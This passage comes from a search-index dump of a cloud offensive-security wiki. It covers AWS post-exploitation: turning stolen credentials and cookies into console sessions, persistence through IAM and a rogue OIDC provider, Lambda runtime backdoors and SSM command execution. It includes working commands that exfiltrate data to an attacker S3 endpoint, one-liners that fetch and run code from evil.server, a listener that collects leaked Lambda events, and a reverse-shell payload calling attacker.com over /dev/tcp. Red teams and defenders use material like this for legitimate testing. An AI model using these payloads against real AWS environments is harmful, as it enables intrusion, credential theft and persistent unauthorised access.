\"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::111111111111:root\"\n      },\n      \"Action\": \"sts:AssumeRole\",\n      \"Condition\": {\n        \"ArnEquals\": {\n          \"aws:PrincipalArn\": \"arn:aws:iam::111111111111:role/Megan\"\n        }\n      }\n    }\n  ]\n}\n</code></pre> <p>Warning</p> <p>Of course, while this approach improves resilience to role deletion, it also removes the protection from privilege escalation and lateral movement abuse offered by the original example. You should carefully evaluate what behavior you need depending on your specific scenario. </p>"},{"location":"aws/general-knowledge/why_recreating_an_iam_role_doesnt_restore_trust_a_gotcha_in_role_arns/#conclusion","title":"Conclusion","text":"<p>IAM roles may look simple on the surface, but the way AWS handles trust relationships is complex: identity resources are more than their name. When you delete and recreate a role, even with the same ARN, AWS treats it as a completely different entity. That distinction can lead to subtle, hard-to-debug failures, especially in SaaS integrations.</p> <p>Whether you\u2019re building secure infrastructure, managing third-party access, or testing cloud security boundaries, understanding this behavior is essential. Trust isn\u2019t just about syntax\u2014it\u2019s about identity, and AWS is very specific about who it trusts.</p>"},{"location":"aws/post_exploitation/create_a_console_session_from_iam_credentials/","title":"Create a Console Session from IAM Credentials","text":"<ul> <li> <p> Technique seen in the wild</p> <p>Reference: Not a SIMulation: CrowdStrike Investigations Reveal Intrusion Campaign Targeting Telco and BPO Companies</p> </li> <li> <p> Tools mentioned in this article</p> <p>aws-vault: A vault for securely storing and accessing AWS credentials in development environments.</p> <p>aws_consoler: A utility to convert your AWS CLI credentials into AWS console access.</p> <p>Pacu: The AWS exploitation framework, designed for testing the security of Amazon Web Services environments.</p> </li> </ul> <p>When performing an AWS assessment you will likely encounter IAM credentials. These credentials can be used with the AWS CLI or other tooling to query the AWS API. </p> <p>While this can be useful, sometimes you just can't beat clicking around the console. If you have IAM credentials, there is a way that you can spawn an AWS Console session using a tool such as aws-vault. This can make certain actions much easier rather than trying to remember the specific flag name for the AWS CLI.</p> <p>Note</p> <p>If you are using temporary IAM credentials (ASIA...), for example, from an EC2 instance, you do not need to have any special IAM permissions to do this. If you are using long-term credentials (AKIA...), you need to have either sts:GetFederationToken or sts:AssumeRole permissions. This is to generate the temporary credentials you will need.</p> <p>Tip</p> <p>If you are attempting to avoid detection, this technique is not recommended. Aside from the suspicious <code>ConsoleLogin</code> CloudTrail log, and the odd user-agent (Ex: Why is the IAM role associated with the CI/CD server using a Firefox user-agent string?), you will also generate a ton of CloudTrail logs.</p>"},{"location":"aws/post_exploitation/create_a_console_session_from_iam_credentials/#using-aws-vault","title":"Using aws-vault","text":"<p>To start, export the relevant environment variables for the IAM credentials you have. Next, install aws-vault.</p> <p>From here, perform the following commands depending on the type of credentials you have.</p>"},{"location":"aws/post_exploitation/create_a_console_session_from_iam_credentials/#user-credentials","title":"User Credentials","text":"<p>For long-term credentials (Those starting with AKIA), there is an extra step that must be completed first. You will need to generate temporary credentials to retrieve the sign in token. To do this, we will make use of sts:GetFederationToken. As an alternative, sts:AssumeRole can also be used.</p> <pre><code>aws sts get-federation-token --name blah\n</code></pre> <p>This will return temporary IAM credentials that you can use with the next step.</p>"},{"location":"aws/post_exploitation/create_a_console_session_from_iam_credentials/#sts-credentials","title":"STS Credentials","text":"<p>For short-term credentials (Those starting with ASIA), you can run the following command:</p> <pre><code>aws-vault login\n</code></pre> <p>Tip</p> <p>If you'd like to generate a link without it automatically opening a new tab in your browser you can use the <code>-s</code> flag and it will be printed to stdout.</p> <p>To learn more about custom identity broker access to the AWS Console please see the official documentation.</p>"},{"location":"aws/post_exploitation/download_tools_and_exfiltrate_data_with_aws_cli/","title":"Download Tools and Exfiltrate Data with the AWS CLI","text":"<ul> <li> <p> Technique seen in the wild</p> <p>Reference: SCARLETEEL 2.0: Fargate, Kubernetes, and Crypto</p> </li> </ul> <p>In an attempt to be stealthy, threat actors will often \"live off the land\", using tools and scripts already existing on a host machine outside of their intended purpose. This can help them avoid detection by blending in with their surroundings.</p> <p>In AWS environments, it is common to find servers which have the AWS CLI installed (It is included by default in Amazon Linux). This makes it an excellent choice for adversaries to move data around, avoiding more common tools like curl or Wget which may be monitored for suspicious uses.</p> <p>As seen in the wild by the SCARLETEEL threat actor, the AWS CLI can be used to download and exfiltrate data using an attacker-hosted backend. You can host an S3 compatible object store such as MinIO and then use the <code>--endpoint-url</code> flag to interact with that service. This makes it easy to download tools, exfiltrate compromised data and more.</p> <pre><code>$ aws s3 ls --endpoint-url https://attacker.s3.store\n2023-07-13 02:06:30 criminalbucket\n2023-07-13 22:01:36 exfiltrated-data\n</code></pre> <p>Tip</p> <p>As mentioned by Jesse Lepich, a layer 7 firewall like the AWS Network Firewall can be used to limit access to non-allowlisted domains.</p>"},{"location":"aws/post_exploitation/get_iam_creds_from_console_session/","title":"Get IAM Credentials from a Console Session","text":"<ul> <li> <p> Original Research</p> <p> <p>Retrieving AWS security credentials from the AWS consoletitle by Christophe Tafani-Dereeper</p> <p></p> </p> </li> </ul> <p>When performing a penetration test or red team assessment, it is not uncommon to gain access to a developer's machine. This presents an opportunity for you to jump into AWS infrastructure via credentials on the system. For a myriad of reasons you may not have access to credentials in the <code>.aws</code> folder, but instead have access to their browser's session cookies (for example via cookies.sqlite in FireFox).</p> <p>Gaining access to the Console is great, but it may not be ideal. You may want to use certain tools that would instead require IAM credentials.</p> <p>To get around this, we can leverage CloudShell. CloudShell exposes IAM credentials via an undocumented endpoint on port 1338. After loading session cookies from the victim into your browser, you can navigate to CloudShell and issue the following commands to get IAM credentials.</p> <pre><code>[user@cloudshell]$ TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\n\n[user@cloudshell]$ curl localhost:1338/latest/meta-data/container/security-credentials -H \"X-aws-ec2-metadata-token: $TOKEN\"\n</code></pre> <p>Alternatively, you can run the following command, which returns credentials with a short TTL (roughly 15m).</p> <pre><code>[user@cloudshell]$ aws configure export-credentials --format env\n</code></pre>"},{"location":"aws/post_exploitation/get_iam_creds_from_console_session/#using-boto3-to-retrieve-credentials","title":"Using boto3 to Retrieve Credentials","text":"<p>Alternatively, you can use Python's boto3 library directly within CloudShell to programmatically retrieve the credentials. This method can be useful when you need to integrate credential extraction into a Python script or automation workflow.</p> <pre><code>import boto3\n\nsession = boto3.Session()\ncreds = session.get_credentials()\nprint({\n    'AccessKey': creds.access_key, \n    'SecretKey': creds.secret_key, \n    'Token': creds.token\n})\n</code></pre> <p></p> <p>This approach leverages boto3's automatic credential detection within the CloudShell environment, providing the same temporary credentials that are available through the metadata service endpoint. The credentials obtained this way will have the same TTL limitations as other methods described above.</p>"},{"location":"aws/post_exploitation/iam_persistence/","title":"AWS IAM Persistence Methods","text":"<p>After gaining a foothold in an AWS environment, an attacker may attempt to establish persistence. Doing this will allow them to return to the account later on to continue their activities. This article is a collection of such persistence techniques. It's worth noting at the time of writing, that this is a small subset of the world of possibilities available to an attacker, and more techniques will be added over time.</p> <p>More complex methods that require additional explanation will link to their respective Hacking the Cloud articles.</p>"},{"location":"aws/post_exploitation/iam_persistence/#iam-user-access-keys","title":"IAM User Access Keys","text":"<ul> <li> <p> Technique seen in the wild</p> <ul> <li>SCARLETEEL 2.0: Fargate, Kubernetes, and Crypto </li> <li>Unmasking GUI-Vil: Financially Motivated Cloud Threat Actor</li> </ul> </li> <li> <p> Required IAM Permission</p> <ul> <li>iam:CreateAccessKey</li> </ul> </li> </ul> <p>AWS IAM users can create pairs of access keys to programmatically interact with the AWS API. These credentials can be used with the AWS CLI and allow those with access to those credentials to perform actions as the associated user.</p> <p>Access keys created this way are long lived (starting with AKIA), meaning that they do not time out or expire by default. Because of this, creating access keys for a user you'd like to maintain access to can be an incredibly simple and easy form of persistence in an AWS environment.</p> <p>Tip</p> <p>Aside from the opportunity to maintain persistence in an AWS environment, <code>iam:CreateAccessKey</code> can also potentially be used for lateral movement to create credentials for other users.</p>"},{"location":"aws/post_exploitation/iam_persistence/#iam-user-login-profile","title":"IAM User Login Profile","text":"<ul> <li> <p> Technique seen in the wild</p> <ul> <li>Unmasking GUI-Vil: Financially Motivated Cloud Threat Actor</li> </ul> </li> <li> <p> Required IAM Permission</p> <ul> <li>iam:CreateLoginProfile</li> </ul> </li> </ul> <p>AWS IAM users can be configured to access the AWS console with a username and password. An adversary with the <code>iam:CreateLoginProfile</code> permission can create login profiles for other users (specifying the password of their choosing). Through this method an adversary can maintain access to an IAM user by logging into the AWS console and performing operations from there.</p>"},{"location":"aws/post_exploitation/iam_persistence/#iam-role-assume-role-policy","title":"IAM Role Assume Role Policy","text":"<ul> <li> <p> Required IAM Permission</p> <ul> <li>iam:UpdateAssumeRolePolicy</li> </ul> </li> </ul> <p>In order to assume an IAM role, a role trust policy must be attached to it. This policy specifies the identities that are permitted to assume the role.</p> <p>An adversary could invoke <code>iam:UpdateAssumeRolePolicy</code>, specifying that their own, attacker-controlled AWS account is permitted to assume the role in the environment. This would allow the adversary to maintain access to that role, and use it when needed.</p> <pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": {\n    \"Effect\": \"Allow\",\n    \"Action\": \"sts:AssumeRole\",\n    \"Resource\": \"arn:aws:iam::&lt;attacker_aws_account_id&gt;:role/secret_admin\"\n  }\n}\n</code></pre> <p>Tip</p> <p>For the defensive side; it is a good idea to regularly audit role trust policies that establish trust with AWS accounts outside of your organization. In most cases, this will likely identify SaaS and vendor AWS accounts, however it may turn up something much more nefarious.</p>"},{"location":"aws/post_exploitation/iam_persistence/#survive-access-key-deletion-with-stsgetfederationtoken","title":"Survive Access Key Deletion with sts:GetFederationToken","text":"<ul> <li> <p> Technique Article</p> <ul> <li>Survive Access Key Deletion with sts:GetFederationToken</li> </ul> </li> </ul>"},{"location":"aws/post_exploitation/iam_persistence/#ec2-instance-persistence","title":"EC2 Instance Persistence","text":"<p>EC2 instances which have an IAM role attached to them will have their own instance metadata service (IMDS) available. If an adversary has code execution on the EC2 instance, or is able to abuse server side request forgery in an application running on the host, they can steal IAM credentials from the IMDS.</p> <p>By maintaining access to an EC2 instance which has a role with the permissions you want, this can be an effective and quiet method to keep access to an AWS environment. No additional API calls are required to use those credentials.</p>"},{"location":"aws/post_exploitation/iam_persistence/#lambda-persistence","title":"Lambda Persistence","text":"<ul> <li> <p> Technique Article</p> <ul> <li>Lambda Persistence</li> </ul> </li> </ul>"},{"location":"aws/post_exploitation/iam_persistence/#user-data-script-persistence","title":"User Data Script Persistence","text":"<ul> <li> <p> Technique Article</p> <ul> <li>User Data Script Persistence</li> </ul> </li> </ul>"},{"location":"aws/post_exploitation/iam_persistence/#iam-oidc-identity-provider","title":"IAM OIDC Identity Provider","text":"<ul> <li> <p> Technique Article</p> <ul> <li>IAM Rogue OIDC Identity Provider</li> </ul> </li> <li> <p> Required IAM Permission</p> <ul> <li>iam:CreateOpenIDConnectProvider</li> <li>iam:UpdateAssumeRolePolicy</li> </ul> </li> </ul>"},{"location":"aws/post_exploitation/iam_rogue_oidc_identity_provider/","title":"IAM Rogue OIDC Identity Provider Persistence","text":"<ul> <li> <p> Original Research</p> <p> <p>RogueOIDC: AWS Persistence and Evasion through attacker-controlled OIDC Identity Provider by Eduard Agavriloae</p> <p></p> </p> </li> </ul> <p>There are multiple ways to obtain persistence in AWS after gaining an initial foothold. This is another, slightly more complex method that, due to its complexity, may go unnoticed for a longer time compared with the well-known ones. </p> <p>This technique involves deploying an OIDC web server, creating an OIDC Identity Provider in AWS and backdoor a role for achieving persistence. For clarity, the steps below specify whether they should be performed in your environment (the attacker) or the victim's environment.</p> <p>Before we begin, you will need a domain for this technique. AWS doesn't accept as OIDC Identity Providers IP addresses or domains that use self-signed certificates.</p>"},{"location":"aws/post_exploitation/iam_rogue_oidc_identity_provider/#1-start-an-ec2-instance","title":"1. Start an EC2 instance","text":"<p>Environment: attacker</p> <p>You will need a server to deploy the web OIDC Identity Provider (IdP). This server should expose port 443 to the internet.</p>"},{"location":"aws/post_exploitation/iam_rogue_oidc_identity_provider/#2-configure-a-dns-record","title":"2. Configure a DNS record","text":"<p>Environment: attacker</p> <p>Add an A DNS record for a subdomain that will point to the IP of the EC2 instance. For the rest of the article we will assume that the subdomain is named <code>oidc</code> and the domain is <code>example.com</code>.</p>"},{"location":"aws/post_exploitation/iam_rogue_oidc_identity_provider/#3-connect-to-the-instance-and-download-rogue-oidc-idp-server","title":"3. Connect to the instance and download Rogue OIDC IdP server","text":"<p>Environment: attacker</p> <pre><code>sudo yum update\nsudo yum install git\ngit clone https://github.com/OffensAI/RogueOIDC\n</code></pre>"},{"location":"aws/post_exploitation/iam_rogue_oidc_identity_provider/#4-generate-certificate","title":"4. Generate certificate","text":"<p>Environment: attacker</p> <p>This will create the cert files at <code>/etc/letsencrypt/live/oidc.example.com/privkey.pem</code> and <code>/etc/letsencrypt/live/oidc.example.com/fullchain.pem</code>.</p> <pre><code>sudo yum install certbot\nsudo certbot certonly --standalone -d oidc.example.com\n</code></pre>"},{"location":"aws/post_exploitation/iam_rogue_oidc_identity_provider/#5-configure-rogue-oidc-identity-provider","title":"5. Configure Rogue OIDC Identity Provider","text":"<p>Environment: attacker</p> <pre><code>cd RogueOIDC/web-app\nvim .env\n</code></pre> <p>Change the configuration using your own domain, change the client secret and optionally the client ID and subject. </p> <pre><code>ISSUER=https://oidc.example.com\nCLIENT_ID=oidc_client\nCLIENT_SECRET=very_secure_password_2027\nREDIRECT_URI=https://oidc.example.com\nSUBJECT=oidc_subject\nSSL_KEYFILE=/etc/letsencrypt/live/oidc.example.com/privkey.pem\nSSL_CERTFILE=/etc/letsencrypt/live/oidc.example.com/fullchain.pem\nHOST=0.0.0.0\nPORT=443\n</code></pre>"},{"location":"aws/post_exploitation/iam_rogue_oidc_identity_provider/#6-install-requirements","title":"6. Install requirements","text":"<p>Environment: attacker</p> <pre><code>cd RogueOIDC/web-app\nsudo yum install pip\nsudo yum install virtualenv\n\nvirtualenv web\nsource web/bin/activate\npip install -r requirements.txt\n</code></pre>"},{"location":"aws/post_exploitation/iam_rogue_oidc_identity_provider/#7-start-the-server","title":"7. Start the server","text":"<p>Environment: attacker</p> <pre><code>sudo web/bin/python main.py\n</code></pre> <p>Verify that <code>https://odic.example.com/.well-known/openid-configuration</code> is accessible and reflects the configurations made.</p>"},{"location":"aws/post_exploitation/iam_rogue_oidc_identity_provider/#8-create-the-oidc-provider","title":"8. Create the OIDC provider","text":"<p>Environment: victim</p> <p>This command will be executed using the compromised identity from the victim's account. The client ID must match the configured client ID from the Rogue OIDC IdP configuration.</p> <pre><code>aws --profile compromised_user iam create-open-id-connect-provider --url https://oidc.example.com --client-id-list oidc_client\n</code></pre>"},{"location":"aws/post_exploitation/iam_rogue_oidc_identity_provider/#9-persistence","title":"9. Persistence","text":"<p>Environment: victim</p> <p>There are two ways to achieve persistence. The first involves creating a role with a trust policy for the OIDC IdP and attaching a policy to it afterwards. This might be easily detected.</p> <p>The second one involves modifying the trust role policy of an existing role. While this is still a well-known persistence technique, combining it with an OIDC IdP may evade detection by some tools and defenders.</p>"},{"location":"aws/post_exploitation/iam_rogue_oidc_identity_provider/#91-create-a-new-role-with-this-oidc-identity-provider-in-the-trust-policy","title":"9.1 Create a new role with this OIDC Identity Provider in the trust policy","text":"<p>The trust role policy document can be found below. Make sure it matches the client ID and subject configured in the Rogue OIDC server.</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"Federated\": \"arn:aws:iam::123456789012:oidc-provider/oidc.example.com\"\n            },\n            \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n            \"Condition\": {\n                \"StringEquals\": {\n                    \"oidc.example.com:aud\": \"oidc_client\",\n                    \"oidc.example.com:sub\": \"oidc_subject\"\n                }\n            }\n        }\n    ]\n}\n</code></pre> <p>Use a unique role name to ensure safe testing.</p> <pre><code>aws --profile compromised_user iam create-role --role-name poc-random-string --assume-role-policy-document file://policy.json\n\naws --profile compromised_user iam attach-role-policy --role-name poc-random-string --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n</code></pre> <p>Now you just created an administrator role that can be assumed with the last step from the article. Keep in mind that is enough to create a role, without attaching any policies for doing a PoC.</p>"},{"location":"aws/post_exploitation/iam_rogue_oidc_identity_provider/#92-modify-the-role-trust-policy-of-an-existing-role","title":"9.2 Modify the role trust policy of an existing role","text":"<p>With this method you would ideally get the trust policy of an existing role, modify it by adding your OIDC provider and update the role with the new policy document. This way, the role would continue to work, but it would also be backdoored.</p> <pre><code>aws --profile compromised_user iam update-assume-role-policy --role-name poc-random-string --policy-document file://policy.json\n</code></pre>"},{"location":"aws/post_exploitation/iam_rogue_oidc_identity_provider/#10-assume-the-role","title":"10. Assume the role","text":"<p>Finally, you can now assume the role at any time. The script for assuming it is in the same repository as the Rogue web OIDC IdP.</p> <pre><code>cd assume-role-script\n\npip install -r requirements.txt\n\n./assume-role-rogue-oidc.py --oidc-url https://oidc.example.com \\\n      --client-id oidc_client \\\n      --client-secret very_secure_password_2027 \\\n      --redirect-uri https://oidc.example.com \\\n      --role-arn arn:aws:iam::123456789012:role/poc \\\n      --role-session-name session_name\n</code></pre> <p>The output will contain the temporary access credentials of the role and will perform an STS GetCallerIdentity to check if the credentials are working.</p> <p>For taking the technique to a more evasion oriented level, make sure to check the original research.</p>"},{"location":"aws/post_exploitation/intercept_ssm_communications/","title":"Intercept SSM Communications","text":"<ul> <li> <p> Original Research</p> <p> <p>Intercept SSM Agent Communications by Nick Frichette </p> <p></p> </p> </li> <li> <p> Tools mentioned in this article</p> <p>ssm-agent-research</p> </li> </ul> <p>The SSM Agent is responsible for allowing EC2 instances to communicate with SSM services. The agent authenticates with SSM via the IAM role and the credentials in the Metadata Service. As a result, if you gain access to an EC2 instance or its IAM credentials you can spoof the agent and intercept EC2 Messages and SSM Sessions.</p> <p>For an in depth explanation of how this works, please see the original research. </p> <p>Warning</p> <p>The tools used in this page are proof of concept, and should not be used for serious use cases. If you create or find a more production-ready tool please open an issue.</p>"},{"location":"aws/post_exploitation/intercept_ssm_communications/#intercept-ec2-messages","title":"Intercept EC2 Messages","text":"<p>The normal operations of the SSM Agent is to poll for messages it has been sent. We can abuse this functionality by frequently polling ourselves. Doing so, will increase the likelihood (to a near guarantee) that we receive the messages before the real SSM agent does.</p> <p>By abusing this functionality we can intercept the EC2 messages and response with our own output, allowing us to force a \"Success\" response.</p> <p>Using the ssm-send-command-interception.py PoC:</p> <p></p> <p></p>"},{"location":"aws/post_exploitation/intercept_ssm_communications/#intercept-ssm-sessions","title":"Intercept SSM Sessions","text":"<p>Normally the SSM Agent will spawn a WebSocket connection back to SSM. This first WebSocket is the control channel and is responsible for spawning the data channels (which actually process the information). Due to this setup, we can spawn our own control channel and intercept all incoming connections. This can allow us to intercept or modify the communications happening, and potentially allow us to intercept sensitive commands and credentials.</p> <p>Using the ssm-session-interception.py PoC:</p> <p></p>"},{"location":"aws/post_exploitation/lambda_persistence/","title":"Lambda Persistence","text":"<ul> <li> <p> Original Research</p> <p>Gaining Persistency on Vulnerable Lambdas by Yuval Avrahami</p> </li> <li> <p> Additional Resources</p> <p>Revisiting Lambda Persistence</p> </li> </ul> <p>Warning</p> <p>Depending on the specific runtime and tools available, you will likely have to change the approach taken to gain persistence in a Lambda function. The general concepts should serve as a guide for a more specific attack you develop.</p> <p>After finding a remote code execution vulnerability in a Lambda function, you'll probably want to establish persistence. The steps to do this will depend on the specific runtime that is being used by the Lambda function. Below the Python and Ruby runtimes are used as an example.</p> <p>Note</p> <p>See the \"Creating a Listener\" section at the bottom of this page for how to setup a listener for exfiltrated data.</p>"},{"location":"aws/post_exploitation/lambda_persistence/#python-runtime","title":"Python Runtime","text":"<p>After identifying that your target is using the Python runtime, you'll need a copy of the <code>/var/runtime/bootstrap.py</code> file. You can get this by either creating your own Lambda function and copying it, or by leaking it from the target Lambda function.</p> <p>Next, you'll want to modify this runtime with some logic to backdoor it. This can be simply done with a few lines such as the following:</p> <p></p> <p>Note</p> <p>You can customize what the backdoor does, depending on what you're looking to do. Maybe you want to leak a specific user's data. Maybe you just want Cookies. It's up to you!</p> <p>With the <code>bootstrap.py</code> file backdoored, you'll want to host it in a location that is accessible for the Lambda function to pull down. </p> <p>The next step is creating a one-liner to pull down this modified code, as well as to terminate the current event in the Runtime API. This can be done by posting to a specific endpoint with the current request ID. All together, that code should look something like this:</p> <pre><code>import urllib3\nimport os\nhttp = urllib3.PoolManager()\n\n# Writing the new bootstrap to a file\nr = http.request('GET', 'https://evil.server/bootstrap.py')\nw = open('/tmp/bootstrap.py', 'w')\nw.write(r.data.decode('utf-8'))\nw.close()\n\n# Getting the current request ID\nr = http.request('GET', 'http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')\nrid = r.headers['Lambda-Runtime-Aws-Request-Id']\n\n# End the current event\nhttp.request('POST', f'http://127.0.0.1:9001/2018-06-01/runtime/invocation/{rid}/response', body='null', headers={'Content-Type':'application/x-www-form-urlencoded'})\n\n# Swap the runtimes\nos.system('python3 /tmp/bootstrap.py')\n</code></pre> <p>Or as a long one-liner (don't forget to change the hostname):</p> <pre><code>python3 -c \"import urllib3;import os;http = urllib3.PoolManager();r = http.request('GET', 'https://evil.server/bootstrap.py');w = open('/tmp/bootstrap.py', 'w');w.write(r.data.decode('utf-8'));w.close();r = http.request('GET', 'http://127.0.0.1:9001/2018-06-01/runtime/invocation/next');rid = r.headers['Lambda-Runtime-Aws-Request-Id'];http.request('POST', f'http://127.0.0.1:9001/2018-06-01/runtime/invocation/{rid}/response', body='null', headers={'Content-Type':'application/x-www-form-urlencoded'});os.system('python3 /tmp/bootstrap.py')\"\n</code></pre> <p>From here on, all subsequent events should be leaked to the attacker. Remember that if the Lambda function is not used for 5-15 minutes, it will become \"cold\" and you will lose access to the persistence you've established. You can execute the function again to keep it \"warm\" or you can simply reestablish persistence.</p>"},{"location":"aws/post_exploitation/lambda_persistence/#ruby-runtime","title":"Ruby Runtime","text":"<p>After identifying that your target is using the Python runtime, you\u2019ll need a copy of the <code>/var/runtime/lib/runtime.rb</code> file. You can get this by either creating your own Lambda function and copying it, or by leaking it from the target Lambda function.</p> <p>Next, you\u2019ll want to modify this runtime with some logic to backdoor it. This can be simply done with a few lines such as the following:</p> <p></p> <p></p> <p>With the <code>runtime.rb</code> file backdoored, you\u2019ll want to host it in a location that is accessible for the Lambda function to pull down. Note, you'll likely want to rename it to something like <code>run.rb</code>. This is because you'll want to create a symbolic link between everything in <code>/var/runtime/lib</code> to <code>/tmp</code>. This will ensure your modified <code>runtime.rb</code> file can access all the additional libraries it needs.</p> <p>The next step is creating a one-liner to create those symbolic links, pull down this modified code, and execute it as well as to terminate the current event in the Runtime API. This can be done by posting to a specific endpoint with the current request ID. All together, that code should look something like this:</p> <pre><code>require 'net/http'\n\n# Writing the new runtime to a file\nuri = URI('https://evil.server/run.rb')\nr = Net::HTTP.get_response(uri)\nFile.write('/tmp/run.rb', r.body)\n\n# Getting the current request ID\nuri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')\nr = Net::HTTP.get_response(uri)\nrid = r.header['Lambda-Runtime-Aws-Request-Id']\n\n# End the current request\nuri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+rid+'/response')\nNet::HTTP.post(uri, 'null')\n</code></pre> <p>Or as a long one-liner (don\u2019t forget to change the hostname, create the symbolic links, or execute the code in the background):</p> <pre><code>ln -s /var/runtime/lib/* /tmp &amp;&amp; ruby -e \"require 'net/http';uri = URI('https://evil.server/run.rb');r = Net::HTTP.get_response(uri);File.write('/tmp/run.rb', r.body);uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next');r = Net::HTTP.get_response(uri);rid = r.header['Lambda-Runtime-Aws-Request-Id'];uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+rid+'/response');Net::HTTP.post(uri, 'null')\" &amp;&amp; ruby /tmp/run.rb &amp;\n</code></pre> <p>From here on, all subsequent events should be leaked to the attacker. Remember that if the Lambda function is not used for 5-15 minutes, it will become \u201ccold\u201d and you will lose access to the persistence you\u2019ve established. You can execute the function again to keep it \u201cwarm\u201d or you can simply reestablish persistence.</p>"},{"location":"aws/post_exploitation/lambda_persistence/#creating-a-listener","title":"Creating a Listener","text":"<p>How you receive leaked events is up to you. The author found that the simplest way was via post requests to an Nginx server. The configuration was simple. First, outside of the server block, include a line like <code>log_format postdata $request_body</code>.</p> <p>Next, include the following inside the server block:</p> <pre><code>location = /post {\n    access_log /var/log/nginx/postdata.log postdata;\n    proxy_pass http://127.0.0.1/post_extra;\n}\nlocation = /post_extra {\n    access_log off;\n    return 200;\n}\n</code></pre> <p>After restarting Nginx, all logs received via post requests should be stored in <code>/var/log/nginx/postdata.log</code>.</p>"},{"location":"aws/post_exploitation/role-chain-juggling/","title":"Role Chain Juggling","text":"<ul> <li> <p> Original Research</p> <p>Daniel Heinsen </p> </li> <li> <p> Tools mentioned in this article</p> <p>AWSRoleJuggler</p> </li> </ul> <p>When doing an assessment in AWS you may want to maintain access for an extended period of time. You may not have the ability to create a new IAM user, or create a new key for existing users. How else can you extend your access? Role Chain Juggling.</p> <p>Role chaining is a recognized functionality of AWS in that you can use one assumed role to assume another one. When this happens the expiration field of the credentials is refreshed. This allows us to keep refreshing credentials over an over again.</p> <p>Through this, you can extend your access by chaining assume-role calls.</p> <p>Note</p> <p>You can chain the same role multiple times so long as the Trust Policy is configured correctly. Additionally, finding roles that can assume each other will allow you to cycle back and forth.</p> <p>To automate this work Daniel Heinsen developed a tool to keep the juggling going.</p> <pre><code>user@host:$ ./aws_role_juggler.py -h\nusage: aws_role_juggler.py [-h] [-r ROLE_LIST [ROLE_LIST ...]]\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -r ROLE_LIST [ROLE_LIST ...], --role-list ROLE_LIST [ROLE_LIST ...]\n</code></pre>"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/","title":"Run Shell Commands on EC2 with Send Command or Session Manager","text":"<p>After escalating privileges in a target AWS account or otherwise gaining privileged access you may want to run commands on EC2 instances in the account. This article hopes to provide a quick and referenceable cheat sheet on how to do this via ssm:SendCommand or ssm:StartSession.</p> <p>Tip</p> <p>By default, the commands that are issued are not logged to CloudTrail. Specifically they are \"HIDDEN_DUE_TO_SECURITY_REASONS\". As a result, if an adversary were to leverage this tactic against an environment, defenders would need to get information about those commands from host based controls. Defenders, this is an excellent capability to validate. Alternatively, offensive security teams can do the testing.</p>"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/#send-command","title":"Send Command","text":"<ul> <li> <p> Required IAM Permissions</p> <ul> <li>ssm:SendCommand</li> </ul> </li> <li> <p> Recommended but not Required IAM Permissions</p> <ul> <li>ssm:ListCommandInvocations</li> <li>ec2:DescribeInstances</li> </ul> </li> </ul> <p>You can send arbitrary shell commands to EC2 instances from the AWS CLI via the following:</p> <pre><code>aws ssm send-command \\\n--instance-ids \"i-00000000000000000\" \\\n--document-name \"AWS-RunShellScript\"\n--parameters commands=\"*shell commands here*\"\n</code></pre> <p>If you're just looking to run a quick C2 payload, or perhaps create a new user this will likely be enough. However, if you also want to retrieve the output of the command you will need to make a ssm:ListCommandInvocations call as well.</p> <p>If you would like to retrieve the output, make a note of the <code>CommandId</code> returned to you in the Send Command call. After a short period of time (to let the command run) you can use this Id to lookup the results. You can do this with the following:</p> <pre><code>aws ssm list-command-invocations \\\n--command-id \"command_id_guid\" \\\n--details\n</code></pre> <p>Note</p> <p>The <code>--details</code> is required to view the output of the command.</p> <p>The output of the command will be in the <code>Output</code> section under <code>CommandPlugins</code>.</p>"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/#advanced-attacks","title":"Advanced Attacks","text":"<p>Section author: Eduard Agavriloae</p> <ul> <li> <p> Tools mentioned in this article</p> <p>EC2StepShell: EC2StepShell is an AWS post-exploitation tool for getting high privileges reverse shells in public or private EC2 instances.</p> <p>fun-with-ssm: Resources for AWS post-exploitation scenarios where you have the permission ssm:SendCommand, but you can't use the AWS-RunPowerShellScript or AWS-RunShellScript documents.</p> </li> </ul>"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/#upgrade-to-a-shell","title":"Upgrade to a shell","text":"<p>If you don't have the ssm:StartSession permission, but you still want something close to a reverse shell, then you can use EC2StepShell.</p> <p>Tip</p> <p>EC2StepShell works on both Windows-UNIX and public-private instances. The tool automatically detect the OS and uses the permissions \"ssm:SendCommand\" for sending commands and either \"ssm:GetCommandInvocation\" or \"ssm:ListCommandInvocations\" for retrieving the output.</p> <p>The tool is just a wrapper over SSM SendCommand, but it makes command execution simpler and it helps in showing impact.</p> <p></p>"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/#using-other-ssm-documents","title":"Using other SSM Documents","text":"<p>Most techniques and tools are using the SSM Documents AWS-RunShellScript and AWS-RunPowerShellScript for executing system commands. In some cases this might be either blocked or heavily monitored. Similarly, execution of SSM Documents owned by other AWS accounts might have the same restrictions.</p> <p></p> <p>There are 7 other SSM Documents that can be used for executing system commands on EC2 instances as first documented in the blog post 7 Lesser-Known AWS SSM Document Techniques for Code Execution.</p>"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/#aws-runsaltstate","title":"AWS-RunSaltState","text":"<p>This document will download from a remote location a Salt state file and interpret it. Salt state files are part of SaltStack, a technology for infrastructure management. The file format is YAML and the AWS-RunSaltState document can download it from S3 Buckets or HTTP(S) servers.</p> <p>The payload for running arbitrary code will use \u201ccmd.run\u201d, as exemplified below where we have a payload for getting a reverse shell.</p> <pre><code>mycommand:\n  cmd.run:\n    - name: 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attacker.com/1337; sh &lt;&amp;196 